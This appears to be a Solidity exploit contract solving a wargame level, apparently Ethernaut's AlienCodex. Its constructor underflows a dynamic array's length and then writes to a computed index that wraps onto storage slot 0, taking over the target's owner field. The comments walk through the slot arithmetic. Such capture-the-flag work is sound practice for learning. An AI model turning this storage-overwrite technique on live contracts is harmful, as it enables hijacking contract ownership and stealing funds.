// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function makeContact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;

    function contact() external returns (bool);

    function codex() external returns (bytes32[] memory);
}

contract Candies {
    // bytes32[] length slot number : 1
    // bytes32[] first element slot number : keccak256(1) = x
    // slot number of i-element of bytes32[] :  h(i) = x + i
    // the goal is to find i where h(i) = 0
    // we will use overflow
    // 0 = x + i
    // i = -x
    // i = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
    // i = 35707666377435648211887908874984608119992236509074197713628505308453184860938

    constructor(IAlienCodex target) {
        target.makeContact();
        target.retract();
        target.revise(getArraySlotPos(1), bytes32(uint256(uint160(tx.origin))));
    }

    function stringToBytes32(string memory _s) internal pure returns (bytes32) {
        bytes32 result;
        assembly {
            result := mload(add(_s, 32))
        }
        return result;
    }

    function getArraySlotPos(uint256 _arrayPos) public pure returns (uint) {
        uint slotNumberOfZero = uint(keccak256(abi.encode(uint256(_arrayPos))));
        uint finalResult;
        unchecked {
            finalResult -= slotNumberOfZero;
        }
        return finalResult;
    }

    // function goGo() public {
    //   bytes32 storageSlot = getArraySlotPos(1);
    //   IAlienCodex(addr).revise(uint(storageSlot),  bytes32(abi.encode(tx.origin)));
    // }

    function goStraight(IAlienCodex target) public {
        target.revise(
            35707666377435648211887908874984608119992236509074197713628505308453184860938,
            bytes32(
                uint256(uint160(0xA07e32bD82f9Ba911D45dA8cA5f6659eC6ae18EC))
            )
        );
    }
}
